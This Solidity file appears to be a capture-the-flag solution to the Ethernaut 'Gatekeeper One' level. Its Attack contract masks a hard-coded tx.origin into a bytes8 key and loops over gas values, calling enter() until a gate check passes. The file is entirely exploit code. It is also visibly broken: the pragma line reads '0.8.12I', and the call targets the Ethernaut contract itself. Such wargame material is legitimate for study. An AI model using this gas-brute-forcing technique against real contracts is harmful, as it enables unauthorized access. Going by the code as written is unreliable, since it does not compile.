// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.12I;
import "./Ethernaut.sol";

// import "hardhat/console.sol";

contract Attack {
    bytes8 txOrigin16 = 0x5B38Da6a701c5685;
    bytes8 public key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    // 0x5B38Da6a00005685

    Ethernaut ethernaut;

    constructor(address _ethernaut) {
        ethernaut = Ethernaut(_ethernaut);
    }

    // not related to the attack. for my own understanding
    // function convert() public {
    //     uint64 a = uint64(key);
    //     uint32 b = uint32(a);
    //     uint16 c = uint16(a);

    //     console.log(a, b, c);
    // }

    function letMeIn() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(ethernaut).call{
                gas: i + 150 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
